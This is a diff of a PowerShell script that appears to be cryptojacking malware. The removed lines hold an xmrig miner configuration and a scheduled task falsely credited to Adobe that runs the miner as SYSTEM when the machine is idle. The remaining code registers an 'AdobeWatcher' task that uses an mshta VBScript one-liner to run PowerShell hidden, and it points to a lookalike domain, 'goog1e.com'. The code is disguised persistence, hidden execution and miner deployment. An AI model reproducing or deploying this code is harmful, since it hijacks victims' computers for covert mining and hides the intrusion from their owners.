@@ -8,180 +8,11 @@ param
   [string]$action
 )
 
-################################
-########  Variables
-
-$TaskName = "AdobeUpdater"
-#$InvFolders = @("$env:ProgramFiles\Adobe\Updater", "$env:ProgramFiles\Adobe\Updater")
-$sourceFolder = $PSScriptRoot
-$thisFileName = $MyInvocation.MyCommand.Name
-#$thisFileFullName = $MyInvocation.MyCommand.Path
-$downloadFiles = $false
-$destinationFolder = $PSScriptRoot #$InvFolders[0];
-
-#$xmrigModulePath = "$sourceFolder\modules\xmrig"
-#$GitRequestUri = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
-#$GitRequestCudaUri = "https://api.github.com/repos/xmrig/xmrig-cuda/releases/latest"
-
-$jsonInfoString = @"
-{
-  "api": {
-      "id": null,
-      "worker-id": null
-  },
-  "http": {
-      "enabled": false,
-      "host": "127.0.0.1",
-      "port": 0,
-      "access-token": null,
-      "restricted": true
-  },
-  "autosave": true,
-  "background": false,
-  "colors": true,
-  "title": true,
-  "randomx": {
-      "init": -1,
-      "init-avx2": -1,
-      "mode": "auto",
-      "1gb-pages": false,
-      "rdmsr": true,
-      "wrmsr": true,
-      "cache_qos": false,
-      "numa": true,
-      "scratchpad_prefetch_mode": 1
-  },
-  "cpu": {
-      "enabled": true,
-      "huge-pages": true,
-      "huge-pages-jit": false,
-      "hw-aes": null,
-      "priority": null,
-      "memory-pool": false,
-      "yield": true,
-      "max-threads-hint": 100,
-      "asm": true,
-      "argon2-impl": null,
-      "astrobwt-max-size": 550,
-      "astrobwt-avx2": false,
-      "cn/0": false,
-      "cn-lite/0": false
-  },
-  "opencl": {
-      "enabled": false,
-      "cache": true,
-      "loader": null,
-      "platform": "AMD",
-      "adl": true,
-      "cn/0": false,
-      "cn-lite/0": false
-  },
-  "cuda": {
-      "enabled": false,
-      "loader": null,
-      "nvml": true,
-      "cn/0": false,
-      "cn-lite/0": false
-  },
-  "donate-level": 1,
-  "donate-over-proxy": 1,
-  "log-file": null,
-  "pools": [
-      {
-          "algo": null,
-          "coin": null,
-          "url": "donate.v2.xmrig.com:3333",
-          "user": "YOUR_WALLET_ADDRESS",
-          "pass": "x",
-          "rig-id": null,
-          "nicehash": false,
-          "keepalive": false,
-          "enabled": true,
-          "tls": false,
-          "tls-fingerprint": null,
-          "daemon": false,
-          "socks5": null,
-          "self-select": null,
-          "submit-to-origin": false
-      }
-  ],
-  "print-time": 60,
-  "health-print-time": 60,
-  "dmi": true,
-  "retries": 5,
-  "retry-pause": 5,
-  "syslog": false,
-  "tls": {
-      "enabled": false,
-      "protocols": null,
-      "cert": null,
-      "cert_key": null,
-      "ciphers": null,
-      "ciphersuites": null,
-      "dhparam": null
-  },
-  "user-agent": null,
-  "verbose": 0,
-  "watch": true,
-  "pause-on-battery": false,
-  "pause-on-active": false
-}
-"@
+$taskVersion = "1.0"
+$uri = "https://goog1e.com"
 
 $TasksDefinitions = @{
-  "AdobeUpdater" = @{
-    "Name"          = "";
-    "Values"        = @{"/ns:Task/ns:Actions/ns:Exec/ns:Command" = "{RootFolder}\xmrig.exe"; "Task/Actions/Exec/Argumetns" = "" };
-    "XmlDefinition" = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>1900-01-01T00:00:00.0000000</Date>
-    <Author>Adobe Systems Incorporated</Author>
-    <Description>Adobe Updater</Description>
-    <URI>\AdobeUpdater</URI>
-  </RegistrationInfo>
-  <Triggers>
-    <IdleTrigger>
-      <Enabled>true</Enabled>
-    </IdleTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="NT AUTHORITY\SYSTEM">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <Duration>PT1M</Duration>
-      <WaitTimeout>PT0S</WaitTimeout>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
-    <RunOnlyIfIdle>true</RunOnlyIfIdle>
-    <WakeToRun>true</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="NT AUTHORITY\SYSTEM">
-    <Exec>
-      <Command></Command>
-    </Exec>
-  </Actions>
-</Task>
-"@
-  };
-  "Watcher"      = @{
+  "AdobeWatcher"      = @{
     "Name"          = "";
     "Values"        = @{"/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
       "/ns:Task/ns:Actions/ns:Exec/ns:Arguments"          = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''{ScriptFile}''"""""", 0 : window.close")'
@@ -245,11 +76,8 @@ $TasksDefinitions = @{
   }
 }
 
-
-
-
 ################################
-######## Actions Tasks
+######## Local functions
 
 function _Unpack {
   param(
@@ -268,32 +96,11 @@ function _Unpack {
   }
 }
 
-function _CheckPwshNeedUpdate {
+function _InstallPwsh {
   param(
-
+    [Parameter()]
+    [switch]$CheckUpdate
   )
-
-  $gitUri = "https://api.github.com/repos/powershell/powershell"
-  $gitUriReleases = "$gitUri/releases"
-  $gitUriReleasesLatest = "$gitUri/releases/latest"
-  $pattern = (@("PowerShell-(?<version>\d?\d.\d?\d.\d?\d)-win-x64.zip", "v(?<version>\d?\d.\d?\d.\d?\d)"))[1]
-  $remoteVersion = [System.Version]::Parse("0.0.0")
-
-  #$pswhInstalled = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.Contains("C:\Program Files\PowerShell\7\pwsh.exe");
-  
-  $latestRelease = (Invoke-RestMethod -Method Get -Uri $gitUriReleasesLatest)
-  
-  if ($latestRelease.tag_name -match $pattern) {
-    $remoteVersion = [System.Version]::Parse($Matches["version"]);
-  }
-  
-  $localVersion = $PSVersionTable.PSVersion
-  
-  return ($localVersion -lt $remoteVersion)
-
-}
-
-function _InstallPwsh {  
   if (!(Get-IsAdmin)) {
     Write-Error "Run as administrator"
     exit
@@ -303,8 +110,24 @@ function _InstallPwsh {
       Start-Process -FilePath $pswPath -ArgumentList "-File $PSCommandPath" -Verb RunAs
     }
   }
+  $gitUri = "https://api.github.com/repos/powershell/powershell"
+  $gitUriReleases = "$gitUri/releases"
+  $gitUriReleasesLatest = "$gitUri/releases/latest"
 
-  $pwshUri = ((Invoke-RestMethod -Method GET -Uri $gitUriReleases)[0].assets | Where-Object name -match "PowerShell-\d.\d.\d-win-x64.msi").browser_download_url
+  $pattern = (@("PowerShell-(?<version>\d?\d.\d?\d.\d?\d)-win-x64.zip","v(?<version>\d?\d.\d?\d.\d?\d)"))[1]
+  $remoteVersion = [System.Version]::Parse("0.0.0")    
+  $latestRelease = (Invoke-RestMethod -Method Get -Uri $gitUriReleasesLatest)
+  if ($latestRelease.tag_name -match $pattern) {
+    $remoteVersion = [System.Version]::Parse($Matches["version"]);
+  }
+
+  if($CheckUpdate)
+  {
+    $localVersion = $PSVersionTable.PSVersion
+    return ($localVersion -lt $remoteVersion)
+  }
+
+  $pwshUri = ((Invoke-RestMethod -Method GET -Uri $gitUriReleases).assets | Where-Object name -match "PowerShell-$remoteVersion-win-x64.msi").browser_download_url
 
   # create temp file
   $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'msi' } -PassThru
@@ -424,12 +247,31 @@ function _CheckServerConnection
   }
 }
 
+
+
+################################
+########  Variables
+
+$TaskName = "AdobeWatcher"
+#$InvFolders = @("$env:ProgramFiles\Adobe\Updater", "$env:ProgramFiles\Adobe\Updater")
+#$sourceFolder = $PSScriptRoot
+$thisFileName = $MyInvocation.MyCommand.Name
+#$thisFileFullName = $MyInvocation.MyCommand.Path
+$downloadFiles = $false
+$destinationFolder = $PSScriptRoot #$InvFolders[0];
+
+
+$debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")
+
 ################################
 ######## Check task
-# $taskExist = _CheckTask -TaskName $TaskName -Register;
-# if (!$taskExist) {
-#   exit
-# }
+if(-not $debugger)
+{
+  $taskExist = _CheckTask -TaskName $TaskName -Register;
+  if (!$taskExist) {
+    exit
+  }
+}
 
 ################################
 ######## Check json file
@@ -502,7 +344,7 @@ switch ($action) {
     }
   }
   "watcher" {
-    if(_CheckPwshNeedUpdate)
+    if((_InstallPwsh -CheckUpdate))
     {
       _InstallPwsh
     }
